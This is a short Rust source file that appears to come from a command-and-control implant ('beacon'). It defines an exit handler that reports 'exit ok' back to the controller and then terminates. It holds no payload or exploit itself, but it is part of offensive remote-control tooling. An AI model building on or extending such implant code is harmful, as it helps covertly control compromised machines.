use std::process::exit;

use crate::util::data_parse::beacon_send_result;
use crate::util::jobs::CALLBACK_OUTPUT;
use crate::BEACON;

pub fn beacon_exit() {
    unsafe {
        beacon_send_result(b"exit ok", &BEACON, CALLBACK_OUTPUT).unwrap();
    }
    exit(0);
}
